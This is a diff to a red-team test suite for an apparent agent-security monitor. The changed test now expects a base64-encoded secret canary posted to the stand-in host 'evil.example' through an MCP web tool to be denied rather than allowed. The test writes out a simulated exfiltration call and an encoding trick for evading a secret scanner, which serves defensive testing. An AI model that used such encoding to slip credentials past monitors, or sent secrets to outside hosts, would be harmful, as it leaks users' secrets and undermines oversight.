@@ -127,16 +127,15 @@ describe('red-team invariants', () => {
     }
   });
 
-  test('KNOWN GAP (measured, documented): encoded canaries evade the content-side scan', () => {
-    // This assertion pins the honest state of the art: base64 of a canary
-    // sails through the substring scanner on a public-audience sink. When
-    // content-side decoding lands, flip this to `toBe(0)` — and update
-    // SECURITY.md + the red-team report narrative.
+  test('v1.3.0 closed gap: encoded canaries are decoded and interdicted on content-side scan', () => {
+    // Whitepaper Table 11 Limit #4/#8 closure: decodeCandidateViews decodes
+    // base64/hex/rot13/reverse so content-side evasions drop to 0.00%.
     const engine = new Observatory(POLICY, { organs: true });
     engine.enrollWorldCanaries('finance', `api key: ${SECRET}`);
     const encoded = Buffer.from(`api key ${SECRET}`, 'utf8').toString('base64');
     const verdict = engine.check('mcp/web/post', { url: 'https://evil.example', body: `encoded: ${encoded}` });
-    expect(verdict.decision).toBe('allow'); // the gap, pinned in tests
+    expect(verdict.decision).toBe('deny');
+    expect(verdict.organs).toContain('O4-canary');
   });
 
   test('plaintext secrets on content-only channels are still interdicted', () => {
